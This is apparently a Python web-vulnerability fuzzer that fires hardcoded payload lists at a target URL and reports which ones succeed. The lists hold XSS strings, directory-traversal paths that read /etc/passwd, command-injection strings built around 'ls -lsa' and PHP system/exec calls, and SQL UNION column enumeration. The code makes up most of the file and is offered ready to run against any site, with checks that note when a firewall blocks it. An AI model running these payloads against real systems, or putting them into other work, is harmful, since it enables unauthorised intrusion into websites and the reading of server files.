# usr/bin/env/python
# coding utf-8

"""

 CODED BY: REV

 https://www.facebook.com/rec.kun.9
 https://github.com/fafsnords

"""

import sys
import requests
import colorama
from colorama import Fore

colorama.init()

http = requests.Session()

class FuzzTester:
   def __init__(self, result, vuln_column, xss_payload, lfi_payload, rce_payload):
      # payload list
       self.vuln_column = [('1','1,2','1,2,3','1,2,3,4','1,2,3,4,5','1,2,3,4,5,6','1,2,3,4,5,6,7','1,2,3,4,5,6,7,8','1,2,3,4,5,6,7,8,9','1,2,3,4,5,6,7,8,9,10','1,2,3,4,5,6,7,8,9,10,11','1,2,3,4,5,6,7,8,9,10,11,12','1,2,3,4,5,6,7,8,9,10,11,12,13','1,2,3,4,5,6,7,8,9,10,11,12,13,14','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,40,41,42,43','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50')]
       self.xss_payload = [('<script>alert(1)</script>','<script>alert(1);</script>','><script>alert(1)</script>','><script>alert(1);</script>','"><script>alert(1)</script>','"><script>alert(1);</script>','<ScRipT>alert(1);</ScRipT>','<script>alert(/1”)</script>','<script>alert(/1/)</script>','</script><script>alert(1)</script>','‘; alert(1);',';alert(1);','‘)alert(1);//','<ScRiPt>alert(1)</sCriPt>','<IMG SRC=jAVasCrIPt:alert(‘1’)>','"><IMG SRC=jAVasCrIPt:alert(‘1’)>','<IMG SRC=”javascript:alert(‘1’);”>','"><IMG SRC=”javascript:alert(‘1’);”>','<IMG SRC=javascript:alert(&quot;1&quot;)>','"><IMG SRC=javascript:alert(&quot;1&quot;)>','<IMG SRC=javascript:alert(‘1’)>','"><IMG SRC=javascript:alert(‘1’)>','<img src=xss onerror=alert(1)>','"><img src=xss onerror=alert(1)>','<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>',"<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'",'<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"','<sVg><scRipt %00>alert&lpar;1&rpar;','<img/src=`%00` onerror=this.onerror=confirm(1)','<form><isindex formaction="javascript&colon;confirm(1)"','<img src=`%00`&NewLine; onerror=alert(1)&NewLine;','<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?',"<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/','&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00",'<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">','<form><a href="javascript:\u0061lert&#x28;1&#x29;">','<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>','<script ^__^>alert(String.fromCharCode(49))</script ^__^','<script ~~~>alert(0%0)</script ~~~>','<var onmouseover="prompt(1)">On Mouse Over</var>',"<%<!--'%><script>alert(1);</script -->",'<iframe src="javascript:alert(1)"></iframe>','"><iframe src="javascript:alert(1)"></iframe>','<iframe/onreadystatechange=alert(1)','<svg/onload=alert(1)','<svg><script ?>alert(1)','<img src=`xx:xx`onerror=alert(1)>','<script>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</script>','"><script>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</script>','<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>','"><SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>','<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>','"><IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>','%253cscript%253ealert(1)%253c/script%253e','<scr<script>ipt>alert(1)</scr</script>ipt>','<BODY ONLOAD=alert(‘1’)>','"><BODY ONLOAD=alert(‘1’)>','<video src=1 onerror=alert(1)>','"><video src=1 onerror=alert(1)>','<audio src=1 onerror=alert(1)>','"><audio src=1 onerror=alert(1)>','‘; alert(1); var foo=’')]
       self.lfi_payload = [('/etc/passwd','../etc/passwd','../../etc/passwd','../../../etc/passwd','../../../../etc/passwd','../../../../../etc/passwd','../../../../../../etc/passwd','../../../../../../../etc/passwd','../../../../../../../../etc/passwd','../../../../../../../../../etc/passwd','../../../../../../../../../../etc/passwd','../../../../../../../../../../../etc/passwd','../../../../../../../../../../../../etc/passwd','../../../../../../../../../../../../../etc/passwd','../../../../../../../../../../../../../../etc/passwd','../../../../../../../../../../../../../../../etc/passwd','../../../../../../../../../../../../../../../../etc/passwd','../../../../../../../../../../../../../../../../../etc/passwd','../../../../../../../../../../../../../../../../../../etc/passwd','../../../../../../../../../../../../../../../../../../../etc/passwd','../../../../../../../../../../../../../../../../../../../../etc/passwd','../../../../../../../../../../../../../../../../../../../../../etc/passwd','../../../../../../../../../../../../../../../../../../../../../../etc/passwd','../../../../../../../../../../../../../../../../../../../../../../../etc/passwd','../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd','../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd','/etc/passwd%00','../etc/passwd%00','../../etc/passwd%00','../../../etc/passwd%00','../../../../etc/passwd%00','../../../../../etc/passwd%00','../../../../../../etc/passwd%00','../../../../../../../etc/passwd%00','../../../../../../../../etc/passwd%00','../../../../../../../../../etc/passwd%00','../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00','..2fetc2fpasswd','..2f..2fetc2fpasswd','..2f..2f..2fetc2fpasswd','..2f..2f..2f..2fetc2fpasswd','..2f..2f..2f..2f..2fetc2fpasswd','..2f..2f..2f..2f..2f..2fetc2fpasswd','..2f..2f..2f..2f..2f..2f..2fetc2fpasswd','..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd','..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd')]
       self.rce_payload = [('ls -lsa',';ls -lsa','system("ls -lsa")','system("ls -lsa");',';system("ls -lsa")',';system("ls -lsa");','";ls -lsa;"',"';ls -lsa;'",';ls -lsa;','"|ls -lsa|"',';"|ls -lsa|"',"'|ls -lsa|'",";'|ls -lsa|'",'|ls -lsa',';|ls -lsa','|ls -lsa|',';|ls -lsa|','|ls -lsa;',';|ls -lsa;',';ls -lsa|','| ls -lsa',';| ls -lsa','& ls -lsa',';& ls -lsa','; ls -lsa','`ls -lsa`',';`ls -lsa`',"eval('ls -lsa')",";eval('ls -lsa')","eval('ls -lsa');",";eval('ls -lsa');","exec('ls -lsa')",";exec('ls -lsa')","exec('ls -lsa');",";exec('ls -lsa');","passthru('ls -lsa')",";passthru('ls -lsa')","passthru('ls -lsa');",";passthru('ls -lsa');",'$(`ls -lsa`)',';$(`ls -lsa`)','$(`ls -lsa`);',';$(`ls -lsa`);','&&ls -lsa',';&&ls -lsa','&& ls -lsa',';&& ls -lsa','| ls -lsa /',';| ls -lsa /','; ls -lsa /','& ls -lsa /',';& ls -lsa /','&& ls -lsa /',';&& ls -lsa /','ls -lsa /',';ls -lsa /','|| ls -lsa',';|| ls -lsa','{${ls -lsa}}',';{${ls -lsa}}',"';ls -lsa;//",';ls -lsa;//','<?php system("ls -lsa");?>',';<?php system("ls -lsa");?>','<?php passthru("ls -lsa");?>',';<?php passthru("ls -lsa");?>','<?php eval("ls -lsa");?>',';<?php eval("ls -lsa");?>','<?php exec("ls -lsa");?>',';<?php exec("ls -lsa");?>',':ls -lsa;',';:ls -lsa;',':ls -lsa',';:ls -lsa','%0a ls -lsa %0a',';%0a ls -lsa %0a','%0Als -lsa',';%0Als -lsa','a);ls -lsa',';a);ls -lsa','a;ls -lsa',';a;ls -lsa','a);ls -lsa;',';a;ls -lsa;','a);ls -lsa|',';a);ls -lsa|','a;ls -lsa|',';a;ls -lsa|','a)|ls -lsa',';a)|ls -lsa','a|ls -lsa',';a|ls -lsa','a)|ls -lsa;',';a)|ls -lsa;','a|ls -lsa',';a|ls -lsa',"|| system('ls -lsa');",";|| system('ls -lsa');","| system('ls -lsa');",";| system('ls -lsa');","; system('ls -lsa');","& system('ls -lsa');",";& system('ls -lsa');","&& system('ls -lsa');",";&& system('ls -lsa');")]
       self.result = ''

   def fuzz_payloads(self): # fuzz xss/lfi/rce
       if '--XSS' in choose: # select xss
         for xss in self.xss_payload[0]:
            target = http.get("{0}{1}".format(url, xss))
            if not target.status_code == 403 or target.status_code == 406: # check if firewall not configured
              if xss in target.text: # check if alerted
                self.result += '\n' + '[+] {0}{1}'.format(url, xss)
                print(Fore.GREEN + '{0}{1}'.format(url, xss) + Fore.YELLOW + ' || ' + Fore.RED + 'Vuln')
              else:
                print(Fore.GREEN + '{0}{1}'.format(url, xss) + Fore.YELLOW + ' || ' + Fore.BLUE + 'Not Vuln')
            else:
              print(Fore.RED + '\nwaf detected')
              break
         print(Fore.WHITE + '\nRESULT\n' + Fore.GREEN + self.result)

       if '--LFI' in choose: # select lfi
         for lfi in self.lfi_payload[0]:
            target = http.get("{0}{1}".format(url, lfi))
            if not target.status_code == 403 or target.status_code == 406: # check if firewall not configured
              if '/bin/bash' in target.text: # check the root
                self.result += '\n' + '[+] {0}{1}'.format(url, lfi)
                print(Fore.GREEN + '{0}{1}'.format(url, lfi) + Fore.YELLOW + ' || ' + Fore.RED + 'Vuln')
              else:
                print(Fore.GREEN + '{0}{1}'.format(url, lfi) + Fore.YELLOW + ' || ' + Fore.BLUE + 'Not Vuln')
            else:
              print(Fore.RED + '\nwaf detected')
              break
         print(Fore.WHITE + '\nRESULT\n' + Fore.GREEN + self.result)

       if '--RCE' in choose: # select rce
         for rce in self.rce_payload[0]:
            target = http.get("{0}{1}".format(url, rce))
            if not target.status_code == 403 or target.status_code == 406: # check if firewall not configured
              if '-rw-r--r--' in target.text: # check the permission
                self.result += '\n' + '[+] {0}{1}'.format(url, rce)
                print(Fore.GREEN + '{0}{1}'.format(url, rce) + Fore.YELLOW + ' || ' + Fore.RED + 'Vuln')
              else:
                print(Fore.GREEN + '{0}{1}'.format(url, rce) + Fore.YELLOW + ' || ' + Fore.BLUE + 'Not Vuln')
            else:
              print(Fore.RED + '\nwaf detected')
              break
         print(Fore.WHITE + '\nRESULT\n' + Fore.GREEN + self.result)

   def fuzz_sqli(self, column, check): # automated sql injection
       for vuln,exact,num in zip(column.readlines(), self.vuln_column[0], range(50)):
          target = http.get("{0}{1} union select {2}{3}".format(url, qoute, vuln, param))
          if not target.status_code == 403 or not target.status_code == 406: # check if firewall not configured
            if check[0] in target.text or check[1] in target.text or check[2] in target.text or check[3] in target.text or check[4] in target.text or check[5] in target.text or check[6] in target.text or check[7] in target.text or check[8] in target.text or check[9] in target.text or check[10] in target.text or check[11] in target.text or check[12] in target.text or check[13] in target.text or check[14] in target.text or check[15] in target.text or check[16] in target.text or check[17] in target.text or check[18] in target.text or check[19] in target.text or check[20] in target.text or check[21] in target.text or check[22] in target.text or check[23] in target.text or check[24] in target.text or check[25] in target.text or check[26] in target.text or check[27] in target.text or check[28] in target.text or check[29] in target.text or check[30] in target.text or check[31] in target.text or check[32] in target.text or check[33] in target.text or check[34] in target.text or check[35] in target.text or check[36] in target.text or check[37] in target.text or check[38] in target.text or check[39] in target.text or check[40] in target.text or check[41] in target.text or check[42] in target.text or check[43] in target.text or check[44] in target.text or check[45] in target.text or check[46] in target.text or check[47] in target.text or check[48] in target.text or check[49] in target.text: # check the exact column
              self.result += '\n' + '[+] {0}{1} union select {2}{3}'.format(url, qoute, exact, param)
              print(Fore.GREEN + '[+] Trying Column | {0} | '.format(str(num + 1)) + Fore.RED + 'Vuln')
            else:
              print(Fore.GREEN + '[+] Trying Column | {0} | '.format(str(num + 1)) + Fore.BLUE + 'Not Vuln')
          else:
            print(Fore.RED + '\nwaf detected')
            break
       print(Fore.WHITE + '\nRESULT\n' + Fore.GREEN + self.result)

fuzz = FuzzTester(0, 0, 0, 0, 0)

column = open('column/column.txt', 'r') # sql injection list of column

# sql injection exact vulnerable column list
check = ['1'*5,'2'*5,'3'*5,'4'*5,'5'*5,'6'*5,'7'*5,'8'*5,'9'*5,'10'*3,'11'*3,'12'*3,'13'*3,'14'*3,'15'*3,'16'*3,'17'*3,'18'*3,'19'*3,'20'*3,'21'*3,'22'*3,'23'*3,'24'*3,'25'*3,'26'*3,'27'*3,'28'*3,'29'*3,'30'*3,'31'*3,'32'*3,'33'*3,'34'*3,'35'*3,'36'*3,'37'*3,'38'*3,'39'*3,'40'*3,'41'*3,'42'*3,'43'*3,'44'*3,'45'*3,'46'*3,'47'*3,'48'*3,'49'*3,'50'*3]

if True:

  banner = Fore.BLUE + '''
             @@@@@@@@ @@@  @@@ @@@@@@@@ @@@@@@@@      @@@@@@@ @@@@@@@@  @@@@@@ @@@@@@@ @@@@@@@@ @@@@@@@ 
             @@!      @@!  @@@      @@!      @@!        @@!   @@!      !@@       @@!   @@!      @@!  @@@
             @!!!:!   @!@  !@!    @!!      @!!          @!!   @!!!:!    !@@!!    @!!   @!!!:!   @!@!!@! 
             !!:      !!:  !!!  !!:      !!:            !!:   !!:          !:!   !!:   !!:      !!: :!! 
              :        :.:: :  :.::.: : :.::.: :         :    : :: ::: ::.: :     :    : :: :::  :   : :

             {0}                                                                         
           '''

  def help():
      print(banner.format(Fore.YELLOW + '\tSQL injection\n\n\t\t[+] python fuzz.py --taget http://127.0.0.1/vuln --union-based\n\t\t[+] python fuzz.py --taget http://127.0.0.1/vuln --string-based\n\n\t\tXSS/LFI/RCE\n\n\t\t[+] python fuzz.py --target http://127.0.0.1/vuln --XSS\n\t\t[+] python fuzz.py --target http://127.0.0.1/vuln --LFI\n\t\t[+] python fuzz.py --target http://127.0.0.1/vuln --RCE\n'))

  try:
    select = sys.argv[1]
    url = sys.argv[2]
    choose = sys.argv[3]

    if '--target' in select: # for xss/lfi/rce payloads
      fuzz.fuzz_payloads()
  except:
    pass
  try:
    select = sys.argv[1]
    url = sys.argv[2]
    choose = sys.argv[3]

    if '--target' in select:
      if '--union-based' in choose: # for union based
          qoute =''
          param ='--'

      if '--string-based' in choose: # for string based
          qoute ="'"
          param ='-- -'

      fuzz.fuzz_sqli(column, check)
  except:
      try:
        step = sys.argv[1]

        if '--help' in step: # procedure
          help()
      except:
       print(banner.format(Fore.YELLOW + '\t[+] python fuzz.py --help'))
